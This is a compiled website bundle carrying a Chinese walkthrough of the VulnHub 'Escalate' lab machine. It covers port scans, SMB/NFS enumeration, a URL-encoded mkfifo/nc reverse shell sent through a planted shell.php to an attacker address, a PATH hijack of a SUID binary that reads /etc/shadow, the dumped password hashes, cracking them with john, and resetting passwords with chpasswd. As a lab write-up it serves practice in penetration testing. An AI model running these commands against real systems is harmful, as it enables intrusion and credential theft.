"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[2254],{4:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>o,contentTitle:()=>l,default:()=>d,frontMatter:()=>a,metadata:()=>s,toc:()=>i});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/Escalate","title":"Escalate","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/Escalate.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/Escalate","permalink":"/docs/VulnHub/Virtual Machines/Escalate","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/Escalate.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"DerpNStink","permalink":"/docs/VulnHub/Virtual Machines/DerpNStink"},"next":{"title":"FALL","permalink":"/docs/VulnHub/Virtual Machines/FALL"}}');var c=r(4848),t=r(8453);const a={},l=void 0,o={},i=[{value:"port scan",id:"port-scan",level:2},{value:"web",id:"web",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2},{value:"\u73af\u5883\u53d8\u91cf\u52ab\u6301",id:"\u73af\u5883\u53d8\u91cf\u52ab\u6301",level:3},{value:"sudo",id:"sudo",level:3}];function p(n){const e={a:"a",code:"code",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",strong:"strong",...(0,t.R)(),...n.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(e.h2,{id:"port-scan",children:"port scan"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Fri Jan 24 02:11:55 2025 as: nmap --min-rate 10000 -p- -oN nmap_result/port 192.168.56.143\r\nNmap scan report for bogon (192.168.56.143)\r\nHost is up (0.00050s latency).\r\nNot shown: 65526 closed tcp ports (conn-refused)\r\nPORT      STATE SERVICE\r\n80/tcp    open  http\r\n111/tcp   open  rpcbind\r\n139/tcp   open  netbios-ssn\r\n445/tcp   open  microsoft-ds\r\n2049/tcp  open  nfs\r\n34017/tcp open  unknown\r\n37677/tcp open  unknown\r\n48923/tcp open  unknown\r\n51139/tcp open  unknown\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Fri Jan 24 02:21:13 2025 as: nmap -sT -sVC -O -p80,111,139,445,2049,34017,37677,48923,51139 -oN nmap_result/detils 192.168.56.143\r\nNmap scan report for bogon (192.168.56.143)\r\nHost is up (0.0012s latency).\r\n\r\nPORT      STATE SERVICE     VERSION\r\n80/tcp    open  http        Apache httpd 2.4.29 ((Ubuntu))\r\n|_http-server-header: Apache/2.4.29 (Ubuntu)\r\n|_http-title: Apache2 Ubuntu Default Page: It works\r\n111/tcp   open  rpcbind     2-4 (RPC #100000)\r\n| rpcinfo: \r\n|   program version    port/proto  service\r\n|   100000  2,3,4        111/tcp   rpcbind\r\n|   100000  2,3,4        111/udp   rpcbind\r\n|   100000  3,4          111/tcp6  rpcbind\r\n|   100000  3,4          111/udp6  rpcbind\r\n|   100003  3           2049/udp   nfs\r\n|   100003  3           2049/udp6  nfs\r\n|   100003  3,4         2049/tcp   nfs\r\n|   100003  3,4         2049/tcp6  nfs\r\n|   100005  1,2,3      36831/tcp6  mountd\r\n|   100005  1,2,3      49338/udp   mountd\r\n|   100005  1,2,3      51139/tcp   mountd\r\n|   100005  1,2,3      59866/udp6  mountd\r\n|   100021  1,3,4      36775/udp   nlockmgr\r\n|   100021  1,3,4      37677/tcp   nlockmgr\r\n|   100021  1,3,4      39329/tcp6  nlockmgr\r\n|   100021  1,3,4      54940/udp6  nlockmgr\r\n|   100227  3           2049/tcp   nfs_acl\r\n|   100227  3           2049/tcp6  nfs_acl\r\n|   100227  3           2049/udp   nfs_acl\r\n|_  100227  3           2049/udp6  nfs_acl\r\n139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r\n445/tcp   open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\r\n2049/tcp  open  nfs         3-4 (RPC #100003)\r\n34017/tcp open  mountd      1-3 (RPC #100005)\r\n37677/tcp open  nlockmgr    1-4 (RPC #100021)\r\n48923/tcp open  mountd      1-3 (RPC #100005)\r\n51139/tcp open  mountd      1-3 (RPC #100005)\r\nMAC Address: 08:00:27:4B:86:76 (Oracle VirtualBox virtual NIC)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 3.X|4.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\r\nOS details: Linux 3.2 - 4.9\r\nNetwork Distance: 1 hop\r\nService Info: Host: LINUX\r\n\r\nHost script results:\r\n| smb2-security-mode: \r\n|   3:1:1: \r\n|_    Message signing enabled but not required\r\n|_nbstat: NetBIOS name: LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\r\n| smb-security-mode: \r\n|   account_used: guest\r\n|   authentication_level: user\r\n|   challenge_response: supported\r\n|_  message_signing: disabled (dangerous, but default)\r\n| smb-os-discovery: \r\n|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\r\n|   Computer name: osboxes\r\n|   NetBIOS computer name: LINUX\\x00\r\n|   Domain name: \\x00\r\n|   FQDN: osboxes\r\n|_  System time: 2025-01-24T02:21:24-05:00\r\n|_clock-skew: mean: 1h39m57s, deviation: 2h53m12s, median: -2s\r\n| smb2-time: \r\n|   date: 2025-01-24T07:21:24\r\n|_  start_date: N/A\n"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.strong,{children:"smb\u670d\u52a1\u6d4b\u8bd5\u679a\u4e3e"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"smbclient -L //IP\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"enum4linux-ng -A 192.168.56.143\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"smbmap --no-banner -H 192.168.56.143\n"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.strong,{children:"2049/tcp  open  nfs"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/Escalate]\r\n\u2514\u2500$ showmount -e 192.168.56.143      \r\nExport list for 192.168.56.143:\r\n/home/user5 *\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/Escalate]\r\n\u2514\u2500$ mount -t nfs 192.168.56.143:/home/user5 /tmp/user5 -nolock\r\nmount.nfs: failed to apply fstab options\n"})}),"\n",(0,c.jsx)(e.h2,{id:"web",children:"web"}),"\n",(0,c.jsxs)(e.p,{children:["dirsearch \u76ee\u5f55\u626b\u63cf\u5230",(0,c.jsx)(e.code,{children:"shell.php"})]}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.a,{href:"http://192.168.56.143/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.56.138%201234%20%3E%2Ftmp%2Ff",children:"http://192.168.56.143/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.56.138%201234%20%3E%2Ftmp%2Ff"})}),"\n",(0,c.jsx)(e.p,{children:"\u62ff\u5230user6\u6743\u9650"}),"\n",(0,c.jsx)(e.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"find / -type f -perm -4000 2>/dev/null\r\n......\r\n/home/user5/script\r\n/home/user3/shell\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u4e24\u4e2a64\u4f4d\u53ef\u6267\u884c\u6587\u4ef6"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.code,{children:"script"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:'int __cdecl main(int argc, const char **argv, const char **envp)\r\n{\r\n  setuid(0);\r\n  setgid(0);\r\n  system("ls");\r\n  return 0;\r\n}\n'})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.code,{children:"shell"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'int __cdecl main(int argc, const char **argv, const char **envp)\r\n{\r\n  setuid(0);\r\n  setgid(0);\r\n  system("./.script.sh");\r\n  return 0;\r\n}\n'})}),"\n",(0,c.jsx)(e.h3,{id:"\u73af\u5883\u53d8\u91cf\u52ab\u6301",children:"\u73af\u5883\u53d8\u91cf\u52ab\u6301"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:'cd /tmp\r\necho "cat /etc/shadow" > ls\r\nchmod 777 ls\r\nexport PATH=/tmp:$PATH\r\ncd /home/user5\r\n./script\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u62ff\u5230hash"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/Escalate]\r\n\u2514\u2500$ cat hash              \r\nroot:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::\r\nuser1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::\r\nuser2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::\r\nuser3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::\r\nuser4:$6$0pxj6KPl$NA5S/2yN3TTJbPypEnsqYe1PrgbfccHntMggLdU2eM5/23dnosIpmD8sRJwI1PyDFgQXH52kYk.bzc6sAVSWm.:18051:0:99999:7:::\r\nuser5:$6$wndyaxl9$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::\r\nuser6:$6$Y9wYnrUW$ihpBL4g3GswEay/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::\r\nmysql:$6$O2ymBAYF$NZDtY392guzYrveKnoISea6oQpv87OpEjEef5KkEUqvtOAjZ2i1UPbkrfmrHG/IonKdnYEec0S0ZBcQFZ.sno/:18053:0:99999:7:::\r\nuser7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::\r\nuser8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7:::\n"})}),"\n",(0,c.jsx)(e.p,{children:"john\u7206\u7834\u62ff\u5230root\u5bc6\u7801\uff1a12345"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250125145222841.png",alt:"image-20250125145222841"})}),"\n",(0,c.jsx)(e.p,{children:"\u6709\u4e9b\u7528\u6237\u5bc6\u7801\u4e0d\u80fd\u7206\u7834\u51fa\u6765\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4fee\u6539\u5bc6\u7801"}),"\n",(0,c.jsxs)(e.p,{children:["\u4f60\u53ef\u4ee5\u901a\u8fc7\u6807\u51c6\u8f93\u5165\u5c06\u7528\u6237\u540d\u548c\u5bc6\u7801\u4f20\u9012\u7ed9 ",(0,c.jsx)(e.code,{children:"chpasswd"}),"\u3002\u4f8b\u5982\uff0c\u5728\u547d\u4ee4\u884c\u4e2d\uff1a"]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-bash",children:'echo "username:password" | sudo chpasswd\n'})}),"\n",(0,c.jsxs)(e.p,{children:["\u8fd9\u91cc\uff0c",(0,c.jsx)(e.code,{children:"username"})," \u662f\u8981\u66f4\u6539\u5bc6\u7801\u7684\u7528\u6237\u540d\uff0c",(0,c.jsx)(e.code,{children:"password"})," \u662f\u65b0\u5bc6\u7801\u3002"]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"echo 'echo \"user1:12345\" | chpasswd' > ls\r\nchmod 777 ls\r\nexport PATH=/tmp:$PATH\r\ncd /home/user5\r\n./script\r\nsu user1\n"})}),"\n",(0,c.jsx)(e.h3,{id:"sudo",children:"sudo"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250125145527325.png",alt:"image-20250125145527325"})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.strong,{children:"/home/user3/shell"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:'cat .script.sh\r\necho "You Can\'t Find Me"\r\nbash -i\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u76f4\u63a5\u6267\u884cshell\u6587\u4ef6\u5373\u53ef\uff0c\u62ff\u5230root\u6743\u9650"})]})}function d(n={}){const{wrapper:e}={...(0,t.R)(),...n.components};return e?(0,c.jsx)(e,{...n,children:(0,c.jsx)(p,{...n})}):p(n)}},8453:(n,e,r)=>{r.d(e,{R:()=>a,x:()=>l});var s=r(6540);const c={},t=s.createContext(c);function a(n){const e=s.useContext(t);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(c):n.components||c:a(n.components),s.createElement(t.Provider,{value:e},n.children)}}}]);